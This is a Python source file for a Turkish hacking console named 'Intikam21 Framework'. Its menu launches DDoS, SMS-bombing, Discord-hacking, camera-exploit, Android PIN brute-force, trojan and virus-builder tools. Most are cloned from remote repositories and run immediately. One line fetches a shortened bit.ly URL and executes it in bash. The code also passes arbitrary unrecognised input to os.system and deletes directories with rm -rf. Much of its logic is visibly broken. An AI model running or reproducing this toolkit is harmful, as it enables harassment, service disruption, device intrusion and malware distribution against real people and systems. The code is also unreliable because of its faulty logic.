⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠤⠒⠒⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⢠⠒⠒⠤⠄⠲⠵⢦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⢒⣉⢀⣀⡀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⠁⠙⠒⢤⣄⡀⠠⣀⠀⠀⠒⠂⠤⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠠⠤⢀⣀⡀⠀⠈⠉⠉⠐⠒⠤ ⢄⣀⠀⠀⠀⠈⠣⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠫⡢⣀⠉⠒⢄⡀⠀⠀⠀⠉⠑⠂⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⠢⠤⣀⡀⠀ ⠀⠀⠉⠒⠢⢄⡀⠈⢦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⢵⠶⢊⡍⢉⠉⠉⠉⠉⠉⠈⠪⡑⠦⡀⠈⠑⠄⠀⠀⠀⠀⠀⠀⠈⠉⠒⠠⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑ ⠒⠤⢀⡀⠀⡠⠌⠉⠒⠬⣦⣀⠀
⠀⠀⠀⠀⠀⠈⢁⠴⢟⠿⣲⢿⣅⢒⠠⢄⡀⠀⠀⠈⠢⡈⠑⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠠⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⢨⠏⠛⠧⣄⠀⠀⠀⠀⠉
⠀⠀⠀⠀⠀⣠⠋⢀⠈⠀⠉⠀⠹⡎⠳⡀⠘⠠⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣀⡀⠀⠀⠀⠀ ⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡼⢛⠞⠫⣀⢀⡀⠀⠀⣿⠀⠘⣦⠀⠀⡀⠀⠀⡇⠀⠀⡴⠀⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠣⠄⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠰⠿⢃⣀⣤⡞⢁⣼⠷⠀⠀⡇⠀⠀⡇⠀⢰⠃⠀⢠⠁⠀⡰⠁⡰⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠤⠔⠒⠒⠂⠀⠀⠀⠀⠉⠉⠉ ⠲⢦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠳⣾⡿⣫⠞⡝⠀⢠⠄⢸⠃⠀⠀⡻⠀⠊⠀⢀⠎⠀⡰⠁⢰⠃⠀⠀⠀⠀⢀⡠⠔⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠉⠻⠦⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠑⠴⠁⡸⠁⠀⡜⢀⡟⠀⠀⠀⡇⠀⠀⡠⡋⠀⠰⢁⡠⡮⠀⠀⠀⣠⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠃⠀⢰⠁⣼⠁⠀⠀⢰⠁⢀⡮⣊⠤⠒⠛⠓⠲⠀⠀⠀⠛⠻⢧⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣄⣀⡀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⠎⠀⠀⡇⠀⡧⠀⠀⠀⡧⣶⠕⠫⠴⠒⠦⠀⠀⠒⠀⠀⠀⡠⠄⠀⠠⢭⡲⢤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢝⠢⣄ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠱⣦⣤⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠁⠀⠀⠀⠀⠱⡀⠙⠚⢧⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡈ ⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢱⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠑⢧⣀⠀⠀⠀⠀⠀⠀⠀⠀⢱ ⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⣆⠀⠀⠈⢆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⢣⠀⠀⠀⠀⠀⢀⠣⣀⠀⠀⠀⠀⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀ ⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢦⡀⠀⠀⠉⠢⢄⠀⠀⠀⠀⢸⠀⠀⠀⢠⠖⠉⡌⠁⠘⡏⡽⠚⠥⣲⡸⠀⠀⠉⠢⠀⠀⠀⠀⠈⠫⢄⣀⡀⠀⠀⡰ ⠁⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⠉⢇⠀⠀⢰⠁⣀⠴⡏⠀⠀⠈⠢⡀⠘⢧⡀⠀⠈⠈⢳⡦⣀⠀⠀⠀⢄⡀⠀⠀⠀⠉⠁⠘⠊⠁ ⠀⣠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠢⠤⢠⡬⠖⠁⣸⡋⢣⡄⠈⠓⠤⣀⣤⠒⡄⠀⠉⠒⠤⣀⣀⠑⢄⠉⠲⢄⡀⠈⠓⠤⠀⠀⠀⠀⠄ ⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠋⠀⢤⡦⠚⢡⠎⠀⢀⡠⠔⠁⢀⡠⠃⠀⠀⠀⢀⠆⠀⢠⠃⠀⠀⠀⠈⠓⠦⠤⢀⣀⣀⡀⠤⠚ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣤⡶⣶⠋⠁⡠⣶⢶⣝⠏⢀⠔⣡⢶⢲⠟⢖⣠⠒⠁⠀⠀⢀⣀⣤⣊⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠛⠹⠊⠉⠉⠘⠉⠻⠒⠒⠁⠀⠓⠓⠛⠃⠀⠁⠀⠀⠀⠀⠛⠗⠓⠿⠖⠋⠁

___ _   _ _____ ___ _  __    _    __  __ ____ 
|_ _| \ | |_   _|_ _| |/ /   / \  |  \/  |___ \/ ( ) 
 | ||  \| | | |  | || ' /   / _ \ | |\/| | __) | |/\___ \
 | || |\  | | |  | || . \  / ___ \| |  | |/ __/| |  ___) |
|___|_| \_| |_| |___|_|\_\/_/   \_\_|  |_|_____|
⠀⠀⠀⠀""" + Fore.RESET,
    Fore.BLUE + """
                                                ___
    |\    ___   |\/|   /\      |            /___)   /\     ^      ___   |   |
    | >  /___   |  |  <  >  |\ |           /  \    <  >   /_\    /      |___|
    |/  /_____  |  |   \/   | \|         //    \\   \/   /   \  (_____  |   |
                |                                \                      |    

                   İ   N   T   İ   K   A   M   2   1 


                                      cDc
                                     _   _
                                    ((___))
                                    [ x x ]
                          cDc        \   /        cDc
                                     (' ')
                                      (U)




                               İ N T İ K A M 2 1
                          -int-   BASE SYSTEM   -int-
                          ---------------------------

                                HAVE A NICE DAY
----------------------- ------------ --------- -------- ------ ---- -- - - - 
    """ + Fore.RESET,
    Fore.BLUE + """
       +-------------------------------------------------+
        |               _                                 |
        |              /  \                               |
        |             /|oo \        İ N T İ K A M 2 1|
        |            (_|  /_)                             |
        |             _`@/_ \    _    F R A M E W O R K |
        |            |     | \   \\                       |
        |            | (*) |  \   ))    Boston, MA, USA   |
        |   ______   |__U__| /  \//                       |
        |  / SUDO \   _//|| _\   /   İntoNet 1:666/1777   |
        | (________) (_/(_|(____/                         |
        |                  (rm)                           |
        +-------------------------------------------------+
    """ + Fore.RESET, 
    Fore.RED + """
                                                                                                        
   @@                               @@@#+::-=+#@    +=@@@@           :**-                               
                                        @@@@@@        @@         =@-  +  @%@%                           
   @@.   @@@      @@  @@@@@@@@@@@%  @@  @@@@@@       #@         % :=@%%%%@*= **                         
   @@.   @@@@     @@      -@@       @@  @@@@@@      *@        :..@# -@@@@* =% *#                        
   @@.   @@ %@.   @@      -@@       @@  @@@@@@     %@         - -%  %+ *%@+ =%.+:                       
   @@.   @@  =@*  @@      -@@       @@  @@@@@@    @@          =:%= @@@*###@  %#@#                       
   @@.   @@   =@@ @@      -@@       @@  @@@@@@   @@           ####  @@@@@@- +###                        
   @@.   @@    +@@@@      -@@       @@  @@@@@@  @@@@#          - =#%@@@@@@@%# =+                        
   @@    @@      @@@      :@@       @@ @@@@@@@@@+   #@@@        #  .=+**+-   #:                         
                                        %@@@@@@      @@@@         =+     :-*                            
                                        #@@@@@       @@@@-                                              
                                        *@@@@@       @@@@@    @@@      -@@@     -@@@   @@@%@@@    #@@@  
                                        +@@@@@       @@@@@   @# %@     -@@@@    @ @@        %@+     #@  
                                        -@@@@@       @@@@@  @@   @@    -@- @.  #@ @@       -@@      #@  
                                        @@@@@@@      @@@@@ *@@   @@=   -@: +@  @  @@     *@@        #@  
                                                     #@@@@@@@.    @@   -@:  @@@:  @@   +@#          #@  
                                                      @@@@@@       @@  -@:  :@@   @@  +@@@@@@@-  :*#@@@ 
                                                        @@@@                                            
                                                                                                                                                                                                 """ + Fore.RESET
    # Daha fazla banner eklenebilir
    ]
    # Rastgele bir banner seçimi yapılıyor
	chosen_banner = random.choice(banners)
    # Seçilen banner'ı yazdır
	print(chosen_banner)



banner()


print(Fore.RED + '------------------------------------------------------------' + Fore.RESET)

print(Fore.BLUE + 'başlatmak için help yaz')
print("""=[ İntikam21-Framework console v2.7.30-dev-bbf096e                  ]
+ -- --=[ 2433 exploits - 1248 auxiliary - 500 post       ]
+ -- --=[ 1465 payloads - 50 encoders - 11 nops           ]
+ -- --=[ 1 evasion ]
+ -- --=[ 103 Tools]
If you can't reach anything, then type 
-->intai 
into the terminal and chat with ai
""")

print(Fore.RED + '------------------------------------------------------------' + Fore.RESET)
def listen():
	import socket
	import sys

	HOST = ip 
	PORT = 5555

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
 	   s.bind((HOST, PORT))
    
	except socket.error as msg:
	    print('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
	sys.exit()
	print('Socket bind complete')
	s.listen(1)
	conn, addr = s.accept()
	print('Connected with ' + addr[0] + ':' + str(addr[1]))
	
			
while True:
	help_input = input(Fore.RED+'┌──(intikam21-cyber@root[~]\n└─$ ')
	print(Fore.RESET) 
	if help_input == "help":
		print(Fore.RED + """
		140 Tools:
			1-) DDOS
			2-) SMSBOMBER
			3-DİSCORD
			4-)METASPLOİT
			5-)İNTİKAM21
			6-)iptracker
			7-)youtube-hack
			8-)Send email
			9-)OSINT Framework
	SPECİAL:	
			----------------------------------------------
			| [10]android-pin-bruteforce |
			-----------------------------------------------
		[11] bruteforce 
		[12]update
		+90 tools: [13]
		+35 tools: [intshark]
		[14]social hack
		[Oip]using oip -h
		[inTrojan] using introjan -h		
				""" + Fore.RESET)
		print("exploit usage: exp-number")
		print(Fore.RED + """
		Exploits:
			[1]-Exploit Database 
			[2]-MSFVENOM
			[3]-MSFCONSOLE
			[4]-NMAP
			[5]-TRAİTOR
			[6]-facebook-id-collector			
			
			SPECİAL:
			---------------------------------------------
		   |. [7]-youtube -------- exploit    |
		   |	[8]-phonesploit	  			|
		   |	[9]-camera exploit			 |
		   |	 [10]-camexp2				   |
			---------------------------------------------	
			
			
			[11] EMAIL FINDER
			[12]-others command: intvenom
			[13]-others command: intvenom
			[14]-others command: intvenom
			[15]-others command: intvenom
			[intweb]Web scanner for intikam21 users
			[intcam]Cam Hack for intikam21 users
			
			we are working...
		
		""" + Fore.RESET)	
	elif help_input == "1":
		os.system("python3 DDOS.py")
	elif help_input == "3":
		os.system("python3 DİSCORD.py")
	elif help_input == "2":
		os.system("python3 SMSBOMBER.py")
	elif help_input == "4":
		time.sleep(1)
		print("termux [y] kali [n]")
		k = input("Do you using [termux/kali] ?")
		if k == "y" or "Y" or "termux" or "Termux" or "TERMUX":
			os.system("pkg update -y && pkg upgrade -y && apt update -y && apt upgrade -y")
			os.system("pkg install wget -y")
			os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
			os.system("chmod +x metasploit.sh")
			os.system("./metasploit.sh")
		elif k == "n" or "N" or "kali" or "Kali" or "KALİ":
			os.system("sudo apt-get install metasploit-framework")
			os.system("msfconsole")
	elif help_input == "5":
		os.system("""apt update & apt upgrade
sudo apt install git
sudo apt install python3-pyfiglet
sudo apt install python3 
sudo apt install python3-base64
sudo apt install python3-colorama
sudo apt install python3-requests

git clone https://github.com/Intikam21kurucu/Intikam21

cd Intikam21

python3 Intıkam21.py""")
	elif help_input == "exp-1":
		print("the exploit is not working ")
	elif help_input == "exp-2":
		try:
			os.system("msfconsole")
		except:
			os.system("sudo apt-get install metasploit-framework")
	elif help_input == "exp-3":
		try:
			os.system("msfvenom")
		except:
			os.system("sudo apt-get install metasploit-framework")
	elif help_input == "exp-4":
		try:
			os.system("pip install nmap")
			os.system("nmap")
		except:
			os.system("sudo apt-get install nmap")
	elif help_input == "exit":
		print("Bye bye / yine bekleriz ")
		os.system("exit")
		break
	elif help_input == "6":
		os.system("python3 iptracker.py")
	elif help_input == "exp-5":
		os.system("""git clone https://github.com/liamg/traitor
		cd traitor
		traitor -p -e docker:writable-socket			
		""")
	elif help_input == "exit":
		print("exiting console...")
		time.sleep(2)
		os.system("exit")
	elif help_input == "exp-6":
		os.system("python2 id-collector.py")
	elif help_input == "exp-7":
		os.system("python3 specialintikam21youtube.py")

	elif help_input == "exp-8":
		os.system("""
git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro.git
cd PhoneSploit-Pro/
pip install -r requirements.txt
python3 phonesploitpro.py""")
	
	elif help_input == "exp-9":
		os.system("python expcamera.py")
	elif help_input == "exp-10":
		s = input ("Do yo want to continue [y/n]")
		if s == "y":
			os.system("python3 camexp2.py")
		elif s == "n":
			print("restarting...")
			time.sleep(3)
			os.system("python3 intconsoleV2.py")

	elif help_input == "7": 
		os.system("""
		git clone https://github.com/in4osecurity/Youtube-Hack
		cd Youtube-Hack
		bash kurulum.sh		
		""")
	elif help_input == "8":
		os.system("python3 sendemail.py")
	elif help_input == "9":
		os.system("python3 OSINT.py")
	elif help_input == "exp-11":
		os.system("python3 emailfinder.py")
	elif help_input == "10":
		s = input("do you want to continue? [y/n]")
		if s == "y":
			os.system("""			
			git clone https://github.com/urbanadventurer/Android-PIN-Bruteforce
			cd Android-PIN-Bruteforce
			./android-pin-bruteforce crack --length 6				""")
		elif s == "n":
			print("restarting...")
			time.sleep(3)
			os.system("python3 intconsoleV3,..py")
	elif help_input == "vp":
		if '-' not in help_input:
			print("please arguments")
		if '-a' or '--add' in help_input:
			global add_add
			add_add = "ADDED"
		if '-a' or '--add' not in help_input:
			add_add = None
		if '-b' or '--build' in help_input:
			if add_add == None:
				print("please use vp add command first")
				global add_slan
				add_slan = None
			if add_add == "ADDED":
				import pyfiglet
				a= pyfiglet.figlet_format("INTIKAM21 OFFİCİAL") 
				print(a)
				print("starting")
				t.sleep(3)
				os.system("sh intvirtualstarter.sh")
				add_slan = "YES"
			elif add_slan == "YES" and add_add == "ADDED":
				print("builded you are must use -all")
		if '-all' in help_input:
			os.system("""
			
			""")
	elif help_input == "11":
		os.system("""
		
		git clone https://github.com/Antu7/python-bruteForce	
		cd python-bruteForce
		pip install requests
		python3 bruteforce.py		
		""")
		
	elif help_input == "12":
	    time.sleep(1)
	    print("Termux=n kali=y")
	    k = input("Are you using [termux/kali]? ")
	    if k == "y" or "Y" or "kali" or "Kali" or "KALİ" or "KAli" or "kAli" or "kALİ" or "kalı" or "KALI" or "kalı":
	        os.system("""
cd ~
rm -rf intframework 
git clone https://github.com/Intikam21kurucu/intframework
cd intframework
chmod +x start_kali.sh
./start_kali.sh
""")
	    elif k == "n" or k == "N" or k == "termux" or k == "Termux" or k == "TERMUX" or k == "TermuX" or k == "tERMUX" or k == "tErmux" or k == "tERmux" or k == "terMux" or k == "tErMUX":
	        os.system("""
cd ~
rm -rf intframework
git clone https://github.com/Intikam21kurucu/intframework
cd intframework
chmod +x terbuild.sh
./terbuild.sh
	""")
	elif help_input == "13":
		os.system("python3 +90wifitools.py")		
	elif help_input == "14":
		os.system("python3 socialhack.py")
	help = {"com-help" or "Com-help" or "Com-Help" or "com-HELP" or "COM-help" or "COM-HELP"}	
	if help_input in help:
		os.system("help")
	valid_commands = [
    "14", "13", "12", "11", "10", "9", "8", "7", "6", "5", "4", "3", "2", "1",
    "exp-11", "exp-10", "exp-9", "exp-8", "exp-7", "exp-6", "exp-5", "exp-4",
    "exp-3", "exp-2", "exp-1", "neofetch", "com-help", "intshark", "İntShark",
    "intSHARK", "İNTSHARK", "iNtShArK", "oip", "introjan", "intai", "track", "build", "mode-admin", "use", "set", "show", "build", "mode-", "back", "item", "search", "show commands", "int install", "connect", "int", "install", "mode-ninja", "int install mode-ninja", "int install git", "int install aichat"
    ]
	if help_input not in valid_commands:
		os.system(help_input)
	if help_input == "intai" or help_input == "İntai" or  help_input == "İNTAİ" or help_input == "İNTai" or help_input == "intAİ":
		os.system("python3 intai.py")
	elif help_input == "neofetch" or help_input == "Neofetch" or help_input == "NEOFETCH":	
		os.system("python3 neofetch.py")
	if help_input == "show commands":
		print(Fore.RED + """		
		|•COMMAND|        |•Function|
		---------------------		 -----------------
mode-{mode-name}	-switches to that mode
		use						-use commands
		set                          -set a settings
		job                          -select a job
		whoami                 -see a name
		neofetch                -see a system
		item					   -Call it with the item command without using callers like Python
		search                   -Search in the console
		star						-chmodding tools
		introjan				 -The best Trojan Horse
		oip					     -information gathering tool
		intshark				-If you can't find anything, type intshark and find additional tools that we don't make or don't recognize
		show					-show commands or tools or exploits
		back					-Back to term or back to console
		break				   -Break to while
		int install			-install packages 
		connect              -connect a ip
		
					USE COMMANDS
		------------------------------------------------------		
			usage : use {set} or {search} or {item}
			
			use {set} -a or framework name
			use {item} code name 
			use {search} 'search commands name'
					
					
				     	SET COMMANDS
		----------------------------------------------------------------
			usage: set -a , set -e  or set {Framework name}
			if mode-admin:
				usage: set -a admin${COMMANDS}
				set -a          - add 
				set -e         -exit
			set -a 			-add
			set -e             -exit
		
				JOB COMMANDS
	-----------------------------------------------------------------
			-a {name}
			-e {exit}
	
						İTEM USAGE
	-----------------------------------------------------------------		
			item 'name.(caller_name)'
			
						SEARCH USAGE
	-----------------------------------------------------------------		
					search 'com-name'
		
	
			     İNTROJAN COMMANDS
	----------------------------------------------------------------				-ip or -ipv4            -İp adress of the target
		-k   						-connect a cable
		-r or --remote       -remote to lxde or cmd
		-d or --dir			  -directory show on computer
		-g   {video url}    -open video url on computer	
		-p    					-port
		-s or --send-message  -send ip or cable to computer
	
			
			     OİP COMMANDS
	----------------------------------------------------------------				-h --help		-help
		-ip				- target ip or domain
		-p -port		-target port
		-t 				-turbo mode on
		-time           -time
		-oip 			-Name or email to search
		-th				- Number of sites to search

	
		

			
									
						SHOW USAGE		
	----------------------------------------------------------------				
		- show {exploits} or {tools} or {commands}

	
		
			
				
					
				CONNECT COMMANDS	
	----------------------------------------------------------------
			
			-p				-ping
			-l				-listen
			-r				-HOSTS
			-port		-port
			
			
HELLO, WE ARE THE İNTİKAM21 CYBER TEAM, THE REASON WE MADE THIS TOOL IS TO EDUCATE PEOPLE WHO LEARN HACKING, ONLY MALWARE BEHAVIOR BY THE USER OR INFECTION OF A SYSTEM IS NOT UNDER OUR RESPONSIBILITY, GOOD WORK🙋			
		""" + Fore.RESET)
	if help_input == "build":
		print("please to use parses ")
		if help_input in "-v":
			print("do you continue?")
			print("we have no responsibility")
			s = input("Do you want to continue?")
			if s.lower() == "n":
				exit()
			if s.lower() == "Y":
				pass
			os.system("""			
			git clone https://github.com/Cyber-Dioxide/Virus-Builder/
			cd Virus-Builder
			ls
			pip install -r requirements.txt
			python3 Builder.py
			""")
		else:
			print("please create virus")
		if help_input in "-b" or "--build":
			os.system("sh build.sh")
		if help_input in "-apk" or "--apk":
			os.system("sh apkbuild.sh")
		else:
			print("please to use argparse or chat with intai!")
		
	elif help_input == "track":
	       print("Tracking")
	       if "-ip" in sys.argv and "-p" in sys.argv:
	           ip_index = sys.argv.index("-ip") + 1
	           port_index = sys.argv.index("-p") + 1
	           ip = sys.argv[ip_index]
	           port = sys.argv[port_index]
	           def attack():
	               import os
	               os.system(f"oip -ip {ip} -p {port}")
	           try:
	           	attack()
	           except:
	           	pass
	elif help_input == "mode-admin":
		print("you are admin mode :)")
		os.system("clear")
		banner()
		admin_input = input("""
		┌──(intikam21-cyber@root[admin]
		└─$""")
		if admin_input == "set -a admin$Off":
			print("adding set")
			t.sleep(2)
			print("offed a set$ADMİN")
			break
			exit()
			os.system("intconsole")
		if admin_input == "set -a admin$Name '{user_name}'":
			global user_name
			print("Now you are name is: "+user_name)
		if admin_input == "set -a admin$WHOAMİ":
			global whoami
			whoami = user_name
			user_name = getpass.getuser()
			print(user_name)
		if admin_input == "set -a admin$RAUNT {name} {command}":
			global command
			global name
			os.system("touch "+name)
			os.system("nano "+name)
			os.system(command)
			os.system("source "+name)
			global list
			list = ["""
			140 Tools:
			1-) DDOS
			2-) SMSBOMBER
			3-DİSCORD
			4-)METASPLOİT
			5-)İNTİKAM21
			6-)iptracker
			7-)youtube-hack
			8-)Send email
			9-)OSINT Framework
	SPECİAL:	
			----------------------------------------------
			| [10]android-pin-bruteforce |
			-----------------------------------------------
		[11] bruteforce 
		[12]update
		+90 tools: [13]
		+35 tools: [intshark]
		[14]social hack
		[Oip]using oip -h
		[inTrojan] using introjan -h
		[{name}] using {name} -h
		"""]
		if admin_input == "set -a admin$HELP":
			print(list)
		if admin_input == "set -a admin$RASSN":
			print("RAT SET SELECT NOTEPAD")
			os.system("introjan -h")
		if admin_input == "use {u_name}":
			global u_name
			u_name = ["intikam21-framework", "metasploit-framework", "Hunner-Framework", "Katana-Framework", "Osint-Framework", "RecoTak-Framework", "Zkit-FRAMEWORK", "On-The-Go-FRAMEWORK", "Cage-FRAMEWORK"]
			if u_name == "Cage-FRAMEWORK":
				os.system("bash <(wget -qO- https://bit.ly/3ilzOl9)")
				os.system("git clone https://github.com/xzendercage/cageframework")
				os.system("cd cageframework")
				os.system("python cageframework.py")
			if u_name == "On-The-Go-FRAMEWORK":
				os.system("git clone https://github.com/Aoshee/onTHEgo")
				os.system("cd onTHEgo")
				os.system("pip install -r REQUIREMENTS")
				os.system("python onTHEgo.py")
			if u_name == "Zkit-FRAMEWORK":
				os.system("git clone git clone https://github.com/000Zer000/ZKit-Framework")
				os.system("cd Zkit-Framework")
				os.system("pip install -r requirements.txt")
			if u_name == "RecoTak-FRAMEWORK":
				os.system("git clone https://github.com/recotak/recotak-framework.git && cd recotak && sh install.sh")
			if u_name == "Osint-FRAMEWORK":
				os.system("""
				git clone https://github.com/TermuxHackz/X-osint
				cd X-osint
				#3) Grant permissions and run install file
				chmod +x *
				bash setup.sh
				""")
			if u_name == "Katana-Framework" or "Katana-FRAMEWORK":
				os.system("""
				git clone https://github.com/PowerScript/KatanaFramework.git
				cd KatanaFramework
				sh dependencies
				python install
				""")
			if u_name == "Hunner-Framework" or "Hunner-FRAMEWORK":
				os.system("git clone https://github.com/b3-v3r/Hunner")
				os.system("cd Hunner")
				os.system("python3 hunner.py")
			if u_name == "metasploit-framework" or "Metasploit-Framework" or "Metasploit-FRAMEWORK":
				os.system("msfconsole")
			else:
				os.system("pkg update -y && pkg upgrade -y && apt update -y && apt upgrade -y")
				os.system("pkg install wget -y")
				os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
				os.system("chmod +x metasploit.sh")
				os.system("./metasploit.sh")
			if u_name == "intikam21-framework" or "İntikam21-Framework" or "intikam21-FRAMEWORK" or "İNTİKAM21-FRAMEWORK":
				exit()
				os.system("intconsole")
			else:
				os.system("""
				cd ~
				rm -rf intframework
				git clone https://github.com/Intikam21kurucu/intframework
				cd intframework
				chmod +x terbuild.sh
				./terbuild.sh
				""")
		if admin_input == "exit":
			exit()
	if help_input == "set":
		global namamal
		namamal = ["{namamal}"]
		if "-" not in help_input:
			print("please arguments[001]")
		if "-a {namamal}" or "--add {namamal}" in help_input:
			namamal = help_input[3:]
			print("setted args[0.1]" + namamal)
			os.system("mkdir -p "+namamal)
		if namamal == "hack":
			print("calm down kid")
			t.sleep(0.4)
			print("setting hack")
			namamal = ["hack"]
			os.system("mkdir -p "+namamal)
		if "-e" or "--exit" in help_input:
			os.system("rm -rf "+namamal)
			namamal = None
		if namamal is None:
			print("PLEASE SET {NAME} USAGE")
			
	if help_input == "use {com_name}":
		global com_name
		com_name = ["set", "back", "item", "star", "search", "msfvenom"]
		if com_name == "back":
			exit()
		if com_name == "item {module}":	
			global module
			global using_module
			global s_name
			global p_name
			global pyc_name
			global r_name
			global h_name
			global php_name
			using_module = ["{s_name}.sh", "{p_name}.py", "{pyc_name}.pyc", "{r_name}.ruby", "{h_name}.html", "{php_name}.php"]
			if module not in using_module:
				print("<> module not finded <>")
			if module == "{s_name}.sh":
				os.system("sh {s_name}.sh")
			if module == "{p_name}.py":
				os.system("python {p_name}.py")
			if module == "{pyc_name}.pyc":
				os.system("pyc {pyc_name}.pyc")
			if module == "{r_name}.ruby":
				os.system("ruby {r_name}.ruby")
			if module == "{h_name}.html":
				os.system("html {h_name}.html")
			if module == "{php_name}.php":
				os.system("php {php_name}.php")
		if com_name == "star":
				os.system("""
				chmod +x intframework
				cd intframework
				chmod +x +90wifitools.py
				chmod +x DDOS.py
				chmod +x DISCORD.py
				chmod +x DİSCORD.py
				chmod +x OSINT.py
				chmod +x SMSBOMBER.py
				chmod +x base.py
				chmod +x build.sh
				chmod +x camexp2.py
				chmod +x data.json
				chmod +x emailfinder.py
				chmod +x expcamera.py
				chmod +x id-collector.py
				chmo:d +x installintconsole.py
				chmod +x int.desktop
				chmod +x intSHARK.py
				chmod +x intai.py
				chmod +x intautoupdate.py
				chmod +x intconsoleV2.py
				chmod +x intikam21.py
				chmod +x introjan
				chmod +x oip
				chmod +x sendemail.py
				chmod +x startoolkit.py
				chmod +x terbuild.sh				
				""")
				print("chmoded intikam21-framework")
		if com_name == "search":
			    # Modül tanımları
			    module_n = {
        "introjan": "the best trojan horse tool",
        "oip": "the #3 information Gathering Tools",
        "intshark": "If you can't find anything, type intshark and find additional tools that we don't make or don't recognize.",
        "use": "use modules",
        "mode-admin": "use admin mode",
        "set": "set command, add and adjust settings",
        "star": "chmodding tools",
        "search": "search tools",
        "item": "Call it with the item command without using callers like Python",
        "show": "show tools or exploits",
        "back": "back to term",
        "job": "select intikam21's job",
        "connect": "listen ip",
        "1": "DDOS TOOL",
        "2": "SMS BOMBER",
        "3": "Discord hacking tool",
        "intweb": "Web hacking Tool",
        "intcam": "Cam Hack For intikam21 users"
        }
            # Kullanıcı girişini kontrol etme
			    if help_input.startswith("search '") and help_input.endswith("'"):
			         	# Aranan ifadeyi al
			         	search_query = help_input.split("search '")[1][:-1].strip()
			         	# Modül adlarında arama yap
			         	found_modules = {}
			         	for module_name, description in module_n.items():
			         	   	if search_query.lower() in description.lower():
			         	   		found_modules[module_name] = description
			         	   		# Sonuçları göster
			         	   		if found_modules:
			         	   			print(f" Modules matching '{search_query}' and their descriptions:")
			         	   		for module_name, description in found_modules.items():
			         	   			print(f"{module_name}: {description}")
			         	   		else:
			         	   			print(f"No modules found matching '{search_query}' Command entry. Enter in the format 'search 'thing to research'.")
		if com_name == "set {set_name}":
				global set_name
				set_name = ["whoami", "neofetch", "job"]
				if set_name == "whoami":
